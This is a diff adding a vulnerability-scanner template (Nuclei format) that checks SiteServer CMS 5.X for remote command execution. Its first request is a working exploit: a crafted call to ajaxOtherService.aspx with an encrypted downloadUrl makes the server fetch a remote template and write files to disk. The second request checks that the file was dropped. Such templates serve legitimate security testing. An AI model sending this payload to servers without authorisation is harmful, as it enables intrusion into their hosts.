@@ -1,0 +1,36 @@
+id: siteservercms-5x-rce
+info:
+  name: SiteServer CMS 5.X Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4oa5N9cVusycgS0add0znslyDJXeCWJASUGK4AggIGXiIeyk57rfpbBYcFf&directoryName=test_vul HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "站点模板下载成功，请到站点模板管理中查看"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /SiteFiles/SiteTemplates/test_vul/test.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: status
+        status:
+          - 200
